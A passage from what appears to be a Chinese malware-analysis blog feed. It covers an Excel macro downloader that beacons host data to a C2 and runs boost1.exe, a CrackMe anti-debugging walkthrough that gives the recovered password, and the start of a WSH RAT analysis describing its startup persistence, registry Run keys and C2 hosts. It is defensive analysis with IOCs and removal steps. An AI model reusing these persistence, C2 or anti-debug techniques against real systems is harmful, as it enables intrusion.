title="分析主要行为函数"></a>分析主要行为函数</h2><p>该样本是通过加载<code>exchange1.dll</code>，然后执行其函数<code>Amway</code>，实现其相应的攻击。该样本的重点就是分析主要行文函数<code>Amway</code>。</p><p><strong>构造网络请求包头</strong></p><p>构造网络请求包头，后面进行数据传输时会用到，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454276748.png" alt="1569454276748"></p><p><strong>获取操作系统信息</strong></p><p>获取了本地主机的==标准DNS名称==、获取了当前==用户信息==，以及==操作系统版本号==，并将数据进行了加工和拼接，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454531764.png" alt="1569454531764"></p><p><strong>枚举进程</strong></p><p>枚举当前的所有进程，并将进程与之前获取的信息进行了拼接，如图：    </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569454828894.png" alt="1569454828894"></p><p>最终将获取到的信息与枚举的进程，进行拼接的结果，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455033474.png" alt="1569455033474"></p><p><strong>与远程服务器通信</strong></p><p>获取远程服务器的域名，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455225847.png" alt="1569455225847"></p><p>将获取到的主机信息，发送至远程服务器，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455549229.png" alt="1569455549229"></p><p><strong>下载可执行文件</strong></p><p>先判断与远程服务器通信的状态码，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455668682.png" alt="1569455668682"></p><p>当状态码为200，也就是连接正常时，下载==可执行文件==，到临时目录下，并命名为<code>boost1.exe</code>。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455713813.png" alt="1569455713813"></p><p><strong>创建进程执行下载文件</strong></p><p>通过函数<code>CreateProcessW</code>，创建进程，执行下载的==可执行文件==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569455934027.png" alt="1569455934027"></p><p>这里由于远程服务器已经宕掉了，这里也无法获取到从远程服务器上下载的文件，进而无法进一步分析下载后的程序<code>boost1.exe</code>。</p><h1 id="0x03-查杀方案"><a href="#0x03-查杀方案" class="headerlink" title="0x03 查杀方案"></a>0x03 查杀方案</h1><p>由于远程服务器宕掉了，并未下载到最终要执行的可执行文件，无法对下载后的可执行文件的行为进行分析，因此无法对该可执行文件进行查杀。</p><p><strong>删除病毒文件</strong></p><p>但目前分析的这个样本本质就是一个下载器，查杀方案只需将该样本本身以及释放出来的所有文件删除即可，要==删除的文件==，如下表：</p><table><thead><tr><th>病毒本身：</th></tr></thead><tbody><tr><td>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</td></tr><tr><td><strong>释放出来的文件：</strong></td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\13.xlsx</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\13.xlsx.zip</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\oleObject1.bin</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Roamingexchange1.dll</td></tr><tr><td>C:\Users\&lt;User&gt;\AppData\Local\Temp\boost1.exe</td></tr></tbody></table><h1 id="0x04-样本溯源"><a href="#0x04-样本溯源" class="headerlink" title="0x04 样本溯源"></a>0x04 样本溯源</h1><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</td><td>346112 bytes</td><td>3108C6B3B4ACC06E8B26AF7AE0142A45</td></tr><tr><td>13.xlsx</td><td>235896 bytes</td><td>90F4CBB72628ABC27FEDBE872A0FFFE6</td></tr><tr><td>13.xlsx.zip</td><td>235896 bytes</td><td>90F4CBB72628ABC27FEDBE872A0FFFE6</td></tr><tr><td>oleObject1.bin</td><td>164864 bytes</td><td>27C9912C99DBC5052A97E9D9EB4C23FA</td></tr><tr><td>exchange1.dll</td><td>81920 bytes</td><td>3707203BDA6A72601CD4461DF3A14240</td></tr></tbody></table><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>https[:]//office-teml-en.com/tw</td></tr></tbody></table><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><blockquote><p>该样本通过Excel进行传播，并借助宏来执行下载和执行文件等恶意行为。因此在查看带有宏的文件时，应多加小心，确认其来源之后，在进行查看。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 宏病毒 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> Downloader </tag>
            
            <tag> 样本分析报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrackMe 1</title>
      <link href="2019/10/01/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/"/>
      <url>2019/10/01/02_%E6%97%A5%E5%B8%B8%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/01_CrackMe_1/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>CrackMe 1</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该Crack Me中有3个反调试，其根据反调试的检测，结果生成不同的KEY。然后利用生成的KEY与密码进行异或，再拿异或后的结果进行比较。只有检测到没有被调试时，该KEY的值才能与密码异或出的结果，才能比较成功。</p></blockquote><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><p>将Crack Me拖入IDA中，查看其main函数，发现主要判断逻辑，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570522558612.png" alt="1570522558612"></p><h2 id="NtGlobalFlags反调试"><a href="#NtGlobalFlags反调试" class="headerlink" title="NtGlobalFlags反调试"></a><code>NtGlobalFlags</code>反调试</h2><p>通过获取PEB中偏移为==0x68==的<code>NTGlobalFlags</code>标志位，来判断当前程序是否被调试，<code>NTGlobalFlags</code>标志位，默认情况下该值为0，如果在调试中会被设置为一个特定的值（0x70），并根据检测结果设置不同的==KEY==值，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570522583999.png" alt="1570522583999"></p><h2 id="NtQueryInformationProcess反调试"><a href="#NtQueryInformationProcess反调试" class="headerlink" title="NtQueryInformationProcess反调试"></a><code>NtQueryInformationProcess</code>反调试</h2><p>该Crack Me通过函数<code>NtQueryInformationProcess</code>，来检测是否被调试。</p><p>其中通过函数<code>NtQueryInformationProcess</code>，进行了3次查询，分别为：</p><ul><li>检测参数==ProcessDebugPort（0x7）==，函数返回调试端口，当调试端口<code>dwDebugPort</code>不为0时，说明当前程序正在被调试。</li><li>检测参数==ProcessDebugObjecthandle（0x1E）==，函数返回调试对象句柄，当句柄<code>hDebugObject</code>不为0时，说明当前程序正在被调试。</li><li>检测参数==Debug Flag(0x1F)==，函数返回调试标志，当标志<code>bDebugFlag</code>为0，则处于调试状态;若为1，则处于非调试状态。</li></ul><p>根据检测结果来生成不同的==KEY==，最终实现干扰password的比较，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570521508893.png" alt="1570521508893"></p><h2 id="NtQueryObject反调试"><a href="#NtQueryObject反调试" class="headerlink" title="NtQueryObject反调试"></a><code>NtQueryObject</code>反调试</h2><p>该Crack Me通过函数<code>NtQueryObject</code>，来检测当前进程是否被调试。</p><p>当一个调试活动开始时，一个==debug object==便会被创建，可通过函数<code>NtQueryObject</code>查找该Object，从而来判断当前程序是否正在被调试，然后根据检测的结果，生成不同的密钥==KEY==，最终实现干扰password的比较，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570511183616.png" alt="1570511183616"></p><p>根据两种反调试函数的检测结果，来生成后面对比密码时用到的==KEY==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570511738666.png" alt="1570511738666"></p><h1 id="获取正确密码"><a href="#获取正确密码" class="headerlink" title="获取正确密码"></a>获取正确密码</h1><p>首先，可以通过IDA或OD，知道密码一共有==20位==，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570511792991.png" alt="1570511792991"></p><p>然后结合IDA，通过OD去调试该<code>CrackMe</code>，发现会将输入的密码的每一位与之前生产的==KEY==进行<code>异或运算</code>，然后将运算结果与地址==true_PW_403250==中存储的数据进行比较，当完全一致时，便能验证密码是正确的。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570512289226.png" alt="1570512289226"></p><p>地址==true_PW_403250==中存储的数据，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570512332320.png" alt="1570512332320"></p><p>因为是将密码<code>Password</code>与密钥==KEY==进行<code>异或</code>后得到地址==true_PW_403250==中的值。</p><h2 id="计算正确密码"><a href="#计算正确密码" class="headerlink" title="计算正确密码"></a>计算正确密码</h2><ul><li><p>要想获得正确密码：就需要将地址==true_PW_403250==中的值与密钥==KEY==进行异或，就能得到原本正确的<code>Password</code>。</p></li><li><p>若命中反调试函数，==KEY==的值会被修改。因此这里用<code>strongOD</code>来反反调试，获取到正确的==KEY==值为37。</p></li><li><p>然后经过计算，便能正确密码。</p></li></ul><p>==正确密码为==：<code>N1ha0bangbangya~^_^~</code></p><p>得到的正确结果，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_CrackMe_1/1570512628384.png" alt="1570512628384"></p>]]></content>
      
      
      <categories>
          
          <category> 日常分析学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CrackMe </tag>
            
            <tag> 丹阳哥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSH RAT分析报告</title>
      <link href="2019/09/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH%20RAT/"/>
      <url>2019/09/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH%20RAT/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>WSH RAT分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>4gdrwceq60b7dbl.sct</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>蠕虫、远控木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>394KB (403,845字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>69B7D326575C5616D82645960B3D081A</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>经过分析，该恶意样本是一个js脚本（伪装成.sct文件），当该样本执行起来，会再释放出两个js文件，并添加开机自启动，感染可移动设备（也通过可移动设备进行传播），并与两个C&amp;C服务器进行交互，从C&amp;C服务器上接收指令，执行不同的操作。其远控功能完事，能释放多种模块，执行不同的指令等。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>![未命名文件](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/未命名文件.png)</p><center>样本执行流程图</center># 0x01 样本细节详细分析<h2 id="提取JS代码"><a href="#提取JS代码" class="headerlink" title="提取JS代码"></a>提取JS代码</h2><p>该样本是一个<font color=red>Script Component</font>格式的文件，属于文本文件，这里直接用记事本打开该文件，发现文件中存在大 量的JS代码，初步判断这是一个由JavaScript编写的恶意代码，通过伪装成.sct文件进行传播的。将其中JS全部拷贝至一个js文件中，本文将其命名为<font color=red>1.js</font>，继续进行下一步分析。文件内容如下：</p><p>![1568788099959](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568788099959.png)</p><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="1-文件写入行为分析"><a href="#1-文件写入行为分析" class="headerlink" title="1.文件写入行为分析"></a>1.文件写入行为分析</h3><p>运行提取出来的JS代码，然后对所有子进程的写入行为进行过滤，发现共写入了4个文件，分别在下表的两个路径中，各释放了taskmgr.js和aFCnKVCdfY.js两个JS文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\User\&lt;UserName&gt;\AppData\Roaming</span><br><span class="line"></span><br><span class="line">C:\Users\&lt;UserName&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Monitor抓取到的行为如图1：</p><p>![1568790008293](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568790008293-1568790100792.png)</p><center>图1</center>- 然后逐步查看文件释放过程，用monitor先对提取出来的1.js文件进行过滤，发现1.js只在C:\User\<UserName>\AppData\Roaming路径下释放了taskmgr.js文件。如图1.1：<p>  ![1568794415800](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568794415800.png)</p>  <center>图1.1</center><ul><li><p>然后对进程taskmgr.js的文件写入行为进行过滤，发现在taskmgr.js在C:\User&lt;UserName&gt;\AppData\Roaming路径下释放了aFCnKVCdfY.js，并且将自身复制到开机自启动目录下，如图1.2：</p><p>![1568794858199](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568794858199.png)</p><center>图1.2</center></li><li><p>然后对进程aFCnKVCdfY.js的文件写入行为进行过滤，发现aFCnKVCdfY.js将自身复制到开机自启目录下，如图1.3：</p><p>![1568795005351](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568795005351.png)</p><center>图1.3</center></li></ul><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><ul><li>查看进程树，运行提取出来的JS代码程序后，迅速结束自身。然后运行释放在AppData中的<font color=red>taskmgr.js</font>。如图2：</li></ul><p>![1568790452813](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568790452813.png)</p><center>图2</center>- 然后执行的脚本<font color=red>taskmgr.js</font>又执行了释放在AppData中的<font color=red>aFCnKVCdf.js</font>，如图3：<p>![1568790636764](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568790636764.png)</p><center>图3</center>### 3.网络行为分析<p>执行起来的两个脚本文件，进行了大量的网络请求。并且从中不难看出，每个脚本都在不断的与一个固定的域名进行通信，且两个脚本所通信的域名也并不相同。如图4：</p><p>![1568791204672](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568791204672.png)</p><center>图4</center>### 4.注册表行为分析<p>运行起来的两个脚本文件，分别添加了两个自启动项，分别为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\taskmgr.js</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\aFCnKVCdf.js</span><br></pre></td></tr></table></figure><p>Monitor抓取的修改注册表行为，如图5：</p><p>![1568791716413](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568791716413.png)</p><center>图5</center>## 样本详细分析<h3 id="释放文件taskmgr-js"><a href="#释放文件taskmgr-js" class="headerlink" title="释放文件taskmgr.js"></a>释放文件taskmgr.js</h3><p>打开提取出来的1.js文件，发现该文件中存在大量经过特殊处理的数据。然后经过分析，1.js这个脚本文件主要是将这些经过加工的数据还原，然后再将还原后的数据写入<font color=red>C:\Users\john\AppData\Roaming\taskmgr.js</font>文件中。也就释放出了Appdata目录下的taskmgr.js文件了，行为可见行为分析图1.1所示。1.js代码执行代码如图：</p><p>![1568798133825](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568798133825.png)</p><h3 id="分析taskmgr-js：解密并执行"><a href="#分析taskmgr-js：解密并执行" class="headerlink" title="分析taskmgr.js：解密并执行"></a>分析taskmgr.js：解密并执行</h3><p>查看taskmgr.js的代码，能发现该代码中又有大量加密过的数据。经过分析，taskmgr.js脚本主要就是将经过替换加密的数据还原，并调用<font color=red>eval()函数</font>，执行解密后的数据。由于该脚本的执行逻辑比较复杂，为了读者能更好的理解，这里将调主要的执行步骤加以说明。</p><ul><li><p>替换过程：首先通过正则表达式选中文中所有的<font color=red>！- %</font>,然后通过函数replace将正则选中的（！- %）全部替换为A,如下图:</p><p>![1568857877945](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568857877945.png)</p></li><li><p>解密过程：先初始化一个元素tmp，将tmp.datatype设置为base64，再将tmp.text设置为上一步替换后的数据，然后通过<font color=red>nodeTypeValue</font>属性，将替换后的数据解密出来，然后再转换为字符串赋值到.oneFam1ly[1].item。此时的.oneFam1ly[1].item就是最终要执行的代码。如图：</p><p>![1568859989461](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568859989461.png)</p></li><li><p>执行过程：先通过meatSTEW执行，执行完返回eval（），然后再通过eval执行上一步解密出来的数据。，如图：</p><p>![1568861002712](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568861002712.png)</p></li></ul><h3 id="分析taskmgr-js所执行的解密代码"><a href="#分析taskmgr-js所执行的解密代码" class="headerlink" title="分析taskmgr.js所执行的解密代码"></a>分析taskmgr.js所执行的解密代码</h3><p>这里以同样的方式进行解密，先将加密数据中的!-%替换为A，再通过notepad++进行解密，就能获取到taskmgr所执行的代码，将解密后的代码保存下来并命名为taskmgr_new_1，代码如下图：</p><p>![1568861303465](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568861303465.png)</p><h3 id="释放文件aFCnKVCdfY-js"><a href="#释放文件aFCnKVCdfY-js" class="headerlink" title="释放文件aFCnKVCdfY.js"></a>释放文件aFCnKVCdfY.js</h3><p>执行的task_new_1,首先释放了文件<font color=red>aFCnKVCdfY.js</font>,先获取Appdata的环境变量，再进行拼接路径，然后将加密的数据写入该文件中，行为可见行为分析图1.2，执行代码如图:</p><p>![1568862105907](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568862105907.png)</p><p>然后下面的部分就先不详细分析了，因为下面的部分与后面将要分析aFCnKVCdfY.js所执行的解密数据的内容基本都是相同的，所以会在后面分析aFCnKVCdfY.js所执行的解密数据中进行详细分析。而taskmgr.js所执行的解密数据中与aFCnKVCdfY.js所执行的解密数据，唯一的不同在于:C&amp;C服务器不同，如图：</p><blockquote><table><thead><tr><th>taskmgr_new_1.js所访问的C&amp;C服务器</th></tr></thead><tbody><tr><td>globalization.duckdns.org：50071</td></tr></tbody></table></blockquote><p>![1568862325996](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568862325996.png)</p><h3 id="分析aFCnKVcdfY-js：解密并执行"><a href="#分析aFCnKVcdfY-js：解密并执行" class="headerlink" title="分析aFCnKVcdfY.js：解密并执行"></a>分析aFCnKVcdfY.js：解密并执行</h3><p>经过对比发现释放出来的文件<font color=red>aFCnKVcdfY.js</font>,与之前分析的<font color=red>taskmgr.js</font>,除了要执行的代码不同外其他都是一样的。因此也就<strong>如同taskmgr.js一样，是解密数据并执行，只不过执行的代码不同罢了</strong>。这里就不在做过多的分析。两个文件的对比图如下：</p><p>![1568863479242](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568863479242.png)</p><h3 id="分析aFCnKVcdfY-js所执行的解密代码"><a href="#分析aFCnKVcdfY-js所执行的解密代码" class="headerlink" title="分析aFCnKVcdfY.js所执行的解密代码"></a>分析aFCnKVcdfY.js所执行的解密代码</h3><h4 id="初始化信息"><a href="#初始化信息" class="headerlink" title="初始化信息"></a>初始化信息</h4><p>初始化后面要用到的数据，如：C&amp;C服务器，和文件下载路径installdir,以及开机自启动路径等信息。如图：</p><p>![1568865304626](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568865304626.png)</p><h4 id="样本主要行为函数分析"><a href="#样本主要行为函数分析" class="headerlink" title="样本主要行为函数分析"></a>样本主要行为函数分析</h4><p>初始化完数据后，代码进入主要执行部分，接下来将逐个分析该恶意样本能做什么做了什么。它的主要行为函数段如下图：![1568869097927](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568869097927.png)</p><h4 id="初始化实例，添加自启动，确保文件已运行"><a href="#初始化实例，添加自启动，确保文件已运行" class="headerlink" title="初始化实例，添加自启动，确保文件已运行"></a>初始化实例，添加自启动，确保文件已运行</h4><p>函数<font color=red>instance</font>，修改注册表项,并调用函数<font color=red>upstart</font>添加开机自启动项，并检查释放出来的文件是否已运行，若没运行便启用。如图：</p><p>![1568871419284](<a href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/03_WSH">https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_样本分析报告/03_WSH</a> RAT/1568871419284.png)</p><ul><li><p>其中添加自启动项函数<font 